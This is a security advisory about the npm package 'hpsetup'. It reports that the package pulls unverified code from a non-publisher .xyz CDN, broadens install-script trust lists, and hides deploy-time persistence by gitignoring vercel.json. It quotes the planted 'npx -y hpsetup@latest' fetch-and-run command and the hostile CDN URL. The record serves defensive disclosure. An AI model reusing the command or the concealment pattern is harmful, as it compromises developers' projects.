summary: hpsetup ships arbitrary code from non-publisher.xyz CDN into consumer node_modules and plants concealed Vercel persistence
details: The package operates as a brand-adjacent installer for an `@heroui-pro/*` npm scope that is unrelated to the legitimate HeroUI project (heroui.com / `@heroui` scope). When invoked (e.g. `npx hpsetup <key>`), it downloads a tarball from `https://hpsetup-cdn.932324.xyz/api/tarball/<slug>/<version>?key=<userKey>` (src/constants.js:16, src/download.js:24) and extracts its contents over `node_modules/@heroui-pro/react` and `heroui-native-pro`. The CDN is a numeric `.xyz` host with no relationship to the publisher; whatever JS bytes the proxy returns are loaded by the consumer's app at runtime, with no hash or signature verification. The operator of 932324.xyz can ship arbitrary code to every consumer at any time. Additional installer-harm signals stack: (1) src/trust.js writes `@zowe/secrets-for-zowe-sdk` — an unrelated mainframe-secrets SDK with a native-build postinstall — into the consumer's `pnpm.onlyBuiltDependencies`, `pnpm-workspace.yaml` allowBuilds, and bun `trustedDependencies`, silently broadening the consumer's install-script trust set to a package they did not opt in to; (2) src/vercel.js writes `installCommand: "npx -y hpsetup@latest <userKey>"` into the consumer's `vercel.json` and then appends `vercel.json` to `.gitignore`, hiding the persistence and the embedded key from git review while Vercel still honors the file at deploy time; (3) src/download.js and src/patch.js mutate third-party packages' `package.json` to delete `scripts` and `dist/postinstall`, creating drift between lockfile and on-disk content. The package.json has no `repository`, `author`, or `homepage` fields. The combination — brand-adjacent scope, non-publisher mutable CDN delivering executable code into node_modules, concealed persistence in a deploy config, and trust-list broadening of an unrelated native-build package — is a supply-chain attack vehicle, not a legitimate installer.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
